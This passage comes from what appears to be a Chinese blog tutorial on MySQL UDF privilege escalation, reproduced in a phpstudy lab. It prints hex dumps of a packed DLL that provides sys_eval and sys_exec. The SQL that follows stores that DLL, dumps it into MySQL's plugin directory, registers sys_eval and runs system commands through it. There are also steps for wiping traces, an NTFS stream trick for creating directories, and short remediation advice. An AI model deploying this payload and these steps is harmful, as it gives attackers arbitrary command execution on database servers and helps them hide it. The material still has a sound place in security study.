7379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 <span class="hljs-keyword">into</span> dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;<br></code></pre></td></tr></table></figure>
<p>本以为可以顺利做下去了，结果竟然没有plugin目录，这里也很疑惑，明明cmd查询到的，服了，这下得手动创建了（没有那味儿了）</p>
<p class='item-img' data-src='image-20230925204934434.png'><img src="image-20230925204934434.png" alt="image-20230925204934434"></p>
<p class='item-img' data-src='image-20230925205014663.png'><img src="image-20230925205014663.png" alt="image-20230925205014663"></p>
<h5 id="5-1-5-创建一个表并将二进制数据插入到十六进制编码流"><a href="#5-1-5-创建一个表并将二进制数据插入到十六进制编码流" class="headerlink" title="5-1-5-创建一个表并将二进制数据插入到十六进制编码流"></a>5.1.5 创建一个表并将二进制数据插入到十六进制编码流</h5>
<p>如果在低版本系统环境下（win2003）或部分特殊环境使用mysql命令提示符进行提权操作，由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p>
<p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用<strong>取四合一</strong>法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p>
<h5 id="5-1-6-随便选择一个数据库后，创建一个表"><a href="#5-1-6-随便选择一个数据库后，创建一个表" class="headerlink" title="5-1-6-随便选择一个数据库后，创建一个表"></a>5.1.6 随便选择一个数据库后，创建一个表</h5>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">use test;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> udf(data longblob);<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925205239370.png'><img src="image-20230925205239370.png" alt="image-20230925205239370"></p>
<p>这里我是新建了一个数据库</p>
<p class='item-img' data-src='image-20230925205329215.png'><img src="image-20230925205329215.png" alt="image-20230925205329215"></p>
<h5 id="5-1-7-insert插入第一段数据"><a href="#5-1-7-insert插入第一段数据" class="headerlink" title="5-1-7-insert插入第一段数据"></a>5.1.7 insert插入第一段数据</h5>
<p>当然这里如果你的数据长度恰好的话，直接插入也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">insert into udf(data) values (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07);<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925205929909.png'><img src="image-20230925205929909.png" alt="image-20230925205929909"></p>
<h5 id="5-1-8-update拼接剩余数据"><a href="#5-1-8-update拼接剩余数据" class="headerlink" title="5-1-8-update拼接剩余数据"></a>5.1.8 update拼接剩余数据</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">update udf set data = concat(data, 0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925205942481.png'><img src="image-20230925205942481.png" alt="image-20230925205942481"></p>
<h5 id="5-1-9-导出表中数据到系统磁盘"><a href="#5-1-9-导出表中数据到系统磁盘" class="headerlink" title="5-1-9-导出表中数据到系统磁盘"></a>5.1.9 导出表中数据到系统磁盘</h5>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> udf <span class="hljs-keyword">into</span> dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925210437927.png'><img src="image-20230925210437927.png" alt="image-20230925210437927"></p>
<p>做到这里突然蒙蔽了，跟着文章做的，但是这里似乎又重复上传了一下，不理解是干嘛的。</p>
<p>我认为在5.1.5步骤之后应该是没有办法直接将udf文件传到plugin目录下的时候所应该有的，而该作者在5.1.5之前就已经靠sql语句写入到了plugin目录下，到这儿应该就是成功了吧，我不理解他的布局了，估计是混乱了</p>
<p><strong>5.1.3 查看 plugin 目录，不存在 lib\plugin目录但有webshell，可使用webshell创建lib\plugin目录。</strong></p>
<p><strong>5.1.4 查看 plugin 目录，不存在 lib\plugin目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了，上次听到这个名词还是在做upload-labs靶场的时候。</strong></p>
<p>ADS文件流是NTFS文件系统为了能与Mac系统下的HFS文件系统兼容而设计出的。</p>
<p>经实践在命令提示符下使用ADS文件流是可以成功创建目录或者文件名的，但在独立安装的mysql数据库环境与phpstudy自带mysql环境下均创建失败，并且查阅网上各种文章也都是没有利用成功的，严重怀疑是哪位小可爱臆想出来的，但为了文章完整性还是决定写出来。</p>
<p>可见没有webshell几乎不可能了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo 123 &gt;C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925213019476.png'><img src="image-20230925213019476.png" alt="image-20230925213019476"></p>
<p>如上图cmd下提示创建lib目录成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select &quot;123&quot; into dumpfile &quot;C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION&quot;;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925213258213.png'><img src="image-20230925213258213.png" alt="image-20230925213258213"></p>
<p>数据库下报错</p>
<h4 id="5-2-mysql小于5-1版本时："><a href="#5-2-mysql小于5-1版本时：" class="headerlink" title="5-2-mysql小于5-1版本时："></a>5.2 mysql小于5.1版本时：</h4>
<p><strong>5.2.1 有webshell时，通过webshell上传udf文件。</strong></p>
<p><strong>5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件。</strong></p>
<h3 id="6、创建命令执行函数"><a href="#6、创建命令执行函数" class="headerlink" title="6、创建命令执行函数"></a>6、创建命令执行函数</h3>
<p>使用winhex打开udf文件，在最下方可以看到udf文件提供的函数。</p>
<p class='item-img' data-src='image-20230925212003551.png'><img src="image-20230925212003551.png" alt="image-20230925212003551"></p>
<p>sys_eval，执行任意系统命令，并将输出返回。</p>
<p>sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925212222362.png'><img src="image-20230925212222362.png" alt="image-20230925212222362"></p>
<h3 id="7、命令执行"><a href="#7、命令执行" class="headerlink" title="7、命令执行"></a>7、命令执行</h3>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925212342687.png'><img src="image-20230925212342687.png" alt="image-20230925212342687"></p>
<p>可以将上述步骤简单总结一下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">注意先指定数据库<br><span class="hljs-number">1.</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> udftmp (c <span class="hljs-type">blob</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。<br><span class="hljs-number">2.</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> udftmp <span class="hljs-keyword">values</span>(unhex(<span class="hljs-string">&#x27;udf文件的16进制格式&#x27;</span>)); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>在udftmp中写入udf文件内容(udf.txt的内容)<br><span class="hljs-number">3.</span> <span class="hljs-keyword">SELECT</span> c <span class="hljs-keyword">FROM</span> udftmp <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;D:\\labwork\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&#x27;</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>将udf文件内容传入新建的udf文件中，路径根据自己的@<span class="hljs-variable">@basedir</span>修改<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>对于mysql小于<span class="hljs-number">5.1</span>的，导出目录为C:\Windows\或C:\Windows\System32\<br></code></pre></td></tr></table></figure>
<h2 id="2-6-痕迹清除"><a href="#2-6-痕迹清除" class="headerlink" title="2-6-痕迹清除"></a>2.6 痕迹清除</h2>
<h3 id="2-6-1-删除表"><a href="#2-6-1-删除表" class="headerlink" title="2-6-1-删除表"></a>2.6.1 删除表</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">drop table udf;<br></code></pre></td></tr></table></figure>
<h3 id="2-6-2-删除函数"><a href="#2-6-2-删除函数" class="headerlink" title="2-6-2-删除函数"></a>2.6.2 删除函数</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">drop function sys_eval;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925212506400.png'><img src="image-20230925212506400.png" alt="image-20230925212506400"></p>
<h2 id="2-7-其他问题"><a href="#2-7-其他问题" class="headerlink" title="2-7-其他问题"></a>2.7 其他问题</h2>
<h3 id="1、ERROR-1125-HY000"><a href="#1、ERROR-1125-HY000" class="headerlink" title="1、ERROR-1125-HY000"></a>1、ERROR 1125 (HY000)</h3>
<p><code>Function 'sys_eval' already exists</code></p>
<p>提示sys_eval 函数已经存在，可能已经被利用过了，尝试直接调用函数。  这里借用别人的图解了</p>
<p class='item-img' data-src='image-20230925212544397.png'><img src="image-20230925212544397.png" alt="image-20230925212544397"></p>
<h3 id="2、提示sys-eval-函数已经存在，但无法利用"><a href="#2、提示sys-eval-函数已经存在，但无法利用" class="headerlink" title="2、提示sys-eval-函数已经存在，但无法利用"></a>2、提示sys_eval 函数已经存在，但无法利用</h3>
<p>尝试将udf提权相关的利用函数进行删除后重新创建</p>
<h3 id="3、创建sys-eval-函数时提示已经存在，但利用与删除时提示-sys-eval"><a href="#3、创建sys-eval-函数时提示已经存在，但利用与删除时提示-sys-eval" class="headerlink" title="3、创建sys-eval-函数时提示已经存在，但利用与删除时提示-sys-eval"></a>3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</h3>
<p>函数不存在（实战无法解决，漏洞复现可以）。**</p>
<p>原因是上一个人利用过后，数据库进行了重启。</p>
<p class='item-img' data-src='image-20230925212649664.png'><img src="image-20230925212649664.png" alt="image-20230925212649664"></p>
<p>之后重启mysqld服务器，再创建就可以了。</p>
<h3 id="4、ERROR-1126-HY000"><a href="#4、ERROR-1126-HY000" class="headerlink" title="4、ERROR-1126-HY000"></a>4、ERROR 1126 (HY000)</h3>
<p><code>Can't open shared library 'udf.dll' (errno: 193 )</code></p>
<p>在进行udf提权时碰到这个错误一般是ufd文件位数选择错误，尝试另一个位数的udf文件。</p>
<h2 id="2-8-修复建议"><a href="#2-8-修复建议" class="headerlink" title="2-8-修复建议"></a>2.8 修复建议</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、mysql配置文件中secure_file_priv项设置为NULL或非 mysql/lib/plugin目录。<br><br>2、数据库用户确保正确实施最小权限原则。<br></code></pre></td></tr></table></figure>
<h1>0x03 Linux-UDF提权</h1>
<p>Linux环境下的UDF提权大概率仅限于靶场环境中，原因：</p>
<p>在Linux严格的系统权限下，mysql用户或web用户无plugin目录的写入权限。</p>
<p class='item-img' data-src='image-20230925213925995.png'><img src="image-20230925213925995.png" alt="image-20230925213925995"></p>
<p>Linux环境下的udf提权除利用条件外与Windows环境下完全相同。</p>
<p>利用条件：除windows篇中的内容外，还需要plugin目录的写入权限。</p>
<p>因此这里我也找文章复现了，只能说遇到的话在研究吧。</p>
<p>下次学习一番逃逸restricted shell，但似乎这类文章不好找┭┮﹏┭┮</p>
<h1>0x04 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16245486.html">[mysql udf提权 ]</a>  --webshell+udf提权可以看这篇</p>
